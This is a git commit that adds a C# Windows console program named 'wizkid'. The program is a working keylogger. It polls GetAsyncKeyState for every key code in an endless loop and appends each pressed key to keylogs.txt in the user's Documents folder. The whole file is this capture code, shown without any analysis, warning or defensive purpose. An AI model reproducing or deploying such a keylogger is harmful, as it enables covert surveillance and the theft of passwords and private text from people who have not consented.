33d0869181e280dd123ff119fa457659504c736f
Faseun <faseunoluwatobilobasimon@gmail.com>
2023-04-17 09:13:39 +0100

    first commit

---
+++ wizkid/Program.cs
@@ -0,0 +1,58 @@
+﻿using System;
+using System.Threading;
+using System.Windows.Forms;
+using System.IO;
+using System.Runtime.InteropServices;
+
+namespace wizkid
+{
+
+    internal static class Program
+    {
+        static string Kellogs = "";
+
+        [DllImport("user32.dll")]
+        public static extern int GetAsyncKeyState(Int32 i);
+
+        static void Main(String[] args)
+        {
+            string filepath = Environment.GetFolderPath(
+                Environment.SpecialFolder.MyDocuments
+                );
+            if (!Directory.Exists(filepath))
+            {
+                Directory.CreateDirectory(filepath);
+            }
+            string path = (filepath + @"\keylogs.txt");
+            if (!File.Exists(path))
+            {
+                using (StreamWriter sw = File.CreateText(path))
+                {
+
+                }
+            }
+            while (true)
+            {
+                Thread.Sleep(500);
+                for (int i = 32; i < 300; i++)
+                {
+                    int keyState = GetAsyncKeyState(i);
+                    if (keyState != 0)
+                    {
+                        Console.WriteLine((Keys)i);
+
+                        using (StreamWriter sw = File.AppendText(path))
+                        {
+                            sw.Write((Keys)i);
+
+
+                        }
+                    }
+
+
+
+                }
+            }
+        }
+    }
+}
